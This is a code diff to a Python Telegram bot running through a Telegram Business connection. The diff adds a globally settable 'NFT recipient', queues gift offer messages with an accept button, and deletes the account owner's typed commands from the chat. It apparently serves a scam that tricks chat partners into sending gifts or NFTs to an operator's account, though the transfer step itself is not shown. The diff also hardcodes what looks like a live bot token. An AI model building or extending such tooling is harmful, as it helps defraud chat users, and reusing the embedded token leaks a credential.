@@ -9,8 +9,6 @@ from aiogram.exceptions import TelegramRetryAfter
 
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
 
-_recipients: dict[str, str] = {}
-
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
@@ -18,6 +16,9 @@ dp = Dispatcher(storage=MemoryStorage())
 message_queue = asyncio.Queue()
 client_user_ids = {}
 _bcid_store: dict[str, dict] = {}
+
+# Один глобальный получатель (меняется через /start или команду)
+current_recipient = {"username": "recipient_username"}
 
 LOCALES = {
     "ru": {
@@ -92,9 +93,59 @@ def make_accept_keyboard(lang, recipient):
         ]
     )
 
-@dp.message(F.chat.type == "private")
-async def handle_private_start(message: Message):
-    await message.answer("Бот успешно работает в фоновом режиме для Telegram Business.")
+def main_menu_keyboard():
+    recipient = current_recipient["username"]
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(
+                text=f"👤 Получатель: @{recipient}",
+                callback_data="show_recipient"
+            )],
+            [InlineKeyboardButton(
+                text="✏️ Изменить получателя",
+                callback_data="change_recipient"
+            )],
+        ]
+    )
+
+@dp.message(F.chat.type == "private", F.text == "/start")
+async def handle_start(message: Message):
+    recipient = current_recipient["username"]
+    await message.answer(
+        f"✅ Бот работает\n\n"
+        f"👤 Текущий получатель НФТ: <b>@{recipient}</b>\n\n"
+        f"Для смены получателя нажми кнопку ниже или отправь:\n"
+        f"<code>/set @username</code>",
+        parse_mode=ParseMode.HTML,
+        reply_markup=main_menu_keyboard()
+    )
+
+@dp.message(F.chat.type == "private", F.text.startswith("/set"))
+async def handle_set_recipient(message: Message):
+    parts = message.text.strip().split()
+    if len(parts) < 2:
+        await message.answer("Использование: <code>/set @username</code>", parse_mode=ParseMode.HTML)
+        return
+    username = parts[1].lstrip("@")
+    current_recipient["username"] = username
+    await message.answer(
+        f"✅ Получатель изменён на <b>@{username}</b>",
+        parse_mode=ParseMode.HTML,
+        reply_markup=main_menu_keyboard()
+    )
+
+@dp.callback_query(F.data == "show_recipient")
+async def cb_show_recipient(cb: CallbackQuery):
+    recipient = current_recipient["username"]
+    await cb.answer(f"Текущий получатель: @{recipient}", show_alert=True)
+
+@dp.callback_query(F.data == "change_recipient")
+async def cb_change_recipient(cb: CallbackQuery):
+    await cb.answer()
+    await cb.message.answer(
+        "Отправь новый юзернейм получателя:\n<code>/set @username</code>",
+        parse_mode=ParseMode.HTML
+    )
 
 @dp.business_message(F.text)
 async def handle_business_command(message: Message):
@@ -106,19 +157,10 @@ async def handle_business_command(message: Message):
 
     parts = text_clean.split()
     bcid = message.business_connection_id
+    chat_id = message.chat.id
 
-    if len(parts) == 3 and parts[1].lower() == "set":
-        username = parts[2].lstrip("@")
-        if bcid:
-            _recipients[bcid] = username
-            try:
-                await bot.delete_business_messages(
-                    business_connection_id=bcid,
-                    message_ids=[message.message_id],
-                )
-            except Exception:
-                pass
-        return
+    if message.from_user:
+        client_user_ids[chat_id] = message.from_user.id
 
     if len(parts) < 3:
         return
@@ -161,9 +203,6 @@ async def handle_business_command(message: Message):
         logging.error(f"Parse error: {e}")
         return
 
-    recipient = _recipients.get(bcid, "recipient_username")
-    chat_id = message.chat.id
-
     await message_queue.put({
         "chat_id": chat_id,
         "gift_name": gift_name,
@@ -174,7 +213,7 @@ async def handle_business_command(message: Message):
         "lang": lang,
         "bcid": bcid,
         "cmd_message_id": message.message_id,
-        "recipient": recipient,
+        "recipient": current_recipient["username"],
     })
 
 @dp.callback_query(F.data.startswith("a|"))
@@ -198,17 +237,11 @@ async def accept_offer(cb: CallbackQuery):
 
     cb_chat_id = cb.message.chat.id
     message_id = cb.message.message_id
-    store_key = f"{cb_chat_id}:{message_id}"
-    stored = _bcid_store.get(store_key)
-
-    logging.warning(f"[ACCEPT] store_key={store_key} stored={stored} bcid_store_keys={list(_bcid_store.keys())}")
-
+    stored    = _bcid_store.get(f"{cb_chat_id}:{message_id}")
     bcid      = stored["bcid"]      if stored else None
     chat_id   = stored["chat_id"]   if stored else cb_chat_id
-    recipient = stored["recipient"] if stored else "recipient_username"
+    recipient = stored["recipient"] if stored else current_recipient["username"]
     lang      = stored.get("lang", lang) if stored else lang
-
-    logging.warning(f"[ACCEPT] chat_id={chat_id} bcid={bcid} recipient={recipient} lang={lang}")
 
     await cb.answer("✅ Успешно принято!", show_alert=True)
 
@@ -258,14 +291,12 @@ async def sender_worker():
             )
 
             if task["bcid"] and sent_msg:
-                store_key = f"{task['chat_id']}:{sent_msg.message_id}"
-                _bcid_store[store_key] = {
+                _bcid_store[f"{task['chat_id']}:{sent_msg.message_id}"] = {
                     "bcid": task["bcid"],
                     "chat_id": task["chat_id"],
                     "recipient": task["recipient"],
                     "lang": task["lang"],
                 }
-                logging.warning(f"[STORE] saved key={store_key} bcid={task['bcid']}")
                 try:
                     await bot.delete_business_messages(
                         business_connection_id=task["bcid"],
@@ -284,13 +315,6 @@ async def sender_worker():
             error_str = str(e)
             if "PEER_FLOOD" in error_str:
                 logging.warning(f"PEER_FLOOD caught in chat {task['chat_id']}")
-                target_user_id = client_user_ids.get(task["chat_id"])
-                loc = LOCALES.get(task["lang"], LOCALES["ru"])
-                if target_user_id:
-                    try:
-                        await bot.send_message(chat_id=target_user_id, text=loc["flood_error"])
-                    except Exception:
-                        pass
             else:
                 logging.error(f"Worker error: {error_str}")
         finally:
